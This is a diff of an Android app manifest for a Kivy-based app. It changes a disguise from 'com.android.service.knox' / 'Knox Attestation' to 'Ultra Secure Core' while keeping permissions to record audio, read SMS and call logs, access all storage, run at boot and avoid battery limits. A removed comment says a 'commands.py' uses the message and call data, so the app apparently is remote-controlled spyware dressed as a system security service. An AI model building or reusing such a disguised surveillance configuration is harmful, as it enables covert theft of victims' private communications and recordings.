@@ -1,10 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.android.service.knox"
-    android:versionCode="20000"
-    android:versionName="2.0.0">
+    package="com.ultra.secure.core.v5"
+    android:versionCode="50000"
+    android:versionName="5.0.0">
 
-    <!-- ✅ تم رفع targetSdkVersion إلى 34 للتوافق مع build.yml -->
     <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="34" />
 
     <!-- الصلاحيات الأساسية -->
@@ -17,7 +16,7 @@
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
 
-    <!-- ✅ صلاحيات الوسائط الجديدة (Android 13+) -->
+    <!-- صلاحيات الوسائط (Android 13+) -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
@@ -27,7 +26,7 @@
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
 
-    <!-- ✅ صلاحية الإشعارات (Android 13+) -->
+    <!-- صلاحية الإشعارات (Android 13+) -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
     <!-- خدمات الخلفية والطاقة -->
@@ -39,25 +38,25 @@
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
-    <!-- ✅ صلاحيات إضافية لقراءة سجل المكالمات والرسائل (مستخدمة في commands.py) -->
+    <!-- صلاحيات إضافية (سجل المكالمات والرسائل) -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
 
-    <!-- ميزات الكاميرا (اختيارية) -->
+    <!-- ميزات الكاميرا اختيارية -->
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
 
     <application
-        android:label="Knox Attestation"
+        android:label="Ultra Secure Core"
         android:icon="@drawable/ic_launcher"
-        android:allowBackup="true"
+        android:allowBackup="false"
         android:usesCleartextTraffic="true"
         android:hardwareAccelerated="true"
         android:requestLegacyExternalStorage="true">
 
         <activity
             android:name="org.kivy.android.PythonActivity"
-            android:label="Knox Attestation"
+            android:label="Ultra Secure Core"
             android:configChanges="mcc|mnc|locale|touchscreen|keyboard|keyboardHidden|navigation|orientation|screenLayout|fontScale|uiMode|screenSize|smallestScreenSize|layoutDirection|density"
             android:launchMode="singleTask"
             android:exported="true">
@@ -74,7 +73,7 @@
             android:exported="false">
             <meta-data
                 android:name="android.service.description"
-                android:value="Knox background security verification and sync." />
+                android:value="Ultra Secure Core background service for security and sync." />
         </service>
 
     </application>
